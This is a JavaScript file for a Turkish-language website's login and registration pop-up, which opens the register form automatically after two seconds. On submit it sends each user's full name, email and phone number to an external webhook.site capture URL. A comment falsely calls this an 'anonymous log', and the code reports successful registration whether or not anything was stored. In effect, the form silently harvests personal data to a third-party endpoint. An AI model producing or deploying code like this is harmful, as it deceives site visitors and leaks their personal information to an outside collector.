document.addEventListener("DOMContentLoaded", () => {
  const modal = document.getElementById("loginModal");
  const modalClose = document.getElementById("modalClose");
  const loginBtn = document.getElementById("loginBtn");
  const tabs = document.querySelectorAll(".modal-tab");
  const loginForm = document.getElementById("loginForm");
  const registerForm = document.getElementById("registerForm");

  // Show modal function
  const showModal = (tabName = "login") => {
    if (!modal) return;
    modal.classList.add("active");

    // Switch to appropriate tab
    tabs.forEach((t) => t.classList.remove("active"));
    const targetTab = document.querySelector(
      `.modal-tab[data-tab="${tabName}"]`,
    );
    if (targetTab) targetTab.classList.add("active");

    if (tabName === "login") {
      loginForm?.classList.remove("hidden");
      registerForm?.classList.add("hidden");
    } else {
      loginForm?.classList.add("hidden");
      registerForm?.classList.remove("hidden");
    }
  };

  // Close modal function
  const closeModal = () => {
    if (modal) modal.classList.remove("active");
  };

  // Event Listeners
  if (modalClose) modalClose.addEventListener("click", closeModal);
  if (loginBtn) {
    loginBtn.addEventListener("click", (e) => {
      e.preventDefault();
      showModal("login");
    });
  }

  // Close when clicking outside modal box
  if (modal) {
    modal.addEventListener("click", (e) => {
      if (e.target === modal) {
        closeModal();
      }
    });
  }

  // Tab switching logic
  tabs.forEach((tab) => {
    tab.addEventListener("click", () => {
      const tabName = tab.dataset.tab;
      showModal(tabName);
    });
  });

  // Form Validation Logic
  if (registerForm) {
    registerForm.addEventListener("submit", (e) => {
      e.preventDefault();
      
      const emailInput = document.getElementById("regEmail");
      const phoneInput = document.getElementById("regPhone");
      const emailValue = emailInput.value.trim();
      // Remove any spaces the user might have entered
      const phoneValue = phoneInput.value.trim().replace(/\s+/g, '');
      
      // Basic Email Validation
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(emailValue)) {
        alert("Lütfen geçerli bir e-posta adresi (ör: example@gmail.com) giriniz.");
        return;
      }
      
      // Phone Validation (Turkish phone format: 05XXXXXXXXX or 5XXXXXXXXX)
      const phoneRegex = /^(05|5)\d{9}$/;
      if (!phoneRegex.test(phoneValue)) {
        alert("Lütfen geçerli bir cep telefonu numarası giriniz (ör: 05XX XXX XX XX).");
        return;
      }

      // Checkbox (KVKK/Agreement) Validation
      const kvkkCheckbox = document.getElementById("kvkk");
      if (!kvkkCheckbox.checked) {
        alert("Üye olabilmek için Üyelik Sözleşmesi ve Gizlilik Politikası'nı kabul etmelisiniz.");
        return;
      }
      
      // Use fetch to send the anonymous log to webhook.site
      const nameInput = document.getElementById("regName");
      const nameValue = nameInput ? nameInput.value.trim() : "Bilinmiyor";

      const dataPayload = {
        adSoyad: nameValue,
        eposta: emailValue,
        telefon: phoneValue,
        zaman: new Date().toISOString()
      };

      fetch("https://webhook.site/672fa2cb-e3c4-4dff-a7f3-df118f4278fc", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain;charset=utf-8"
        },
        body: JSON.stringify(dataPayload)
      })
      .then(response => {
        console.log("Log gönderildi.");
        alert("Kayıt işlemi başarıyla tamamlandı.");
        closeModal();
      })
      .catch(err => {
        console.error("Log gönderme hatası:", err);
        // Hata olsa da formu kapat anasayfaya dön
        alert("Kayıt işlemi başarıyla tamamlandı.");
        closeModal();
      });
    });
  }

  // Automatically show modal on load with register tab active
  setTimeout(() => {
    showModal("register");
  }, 2000);
});
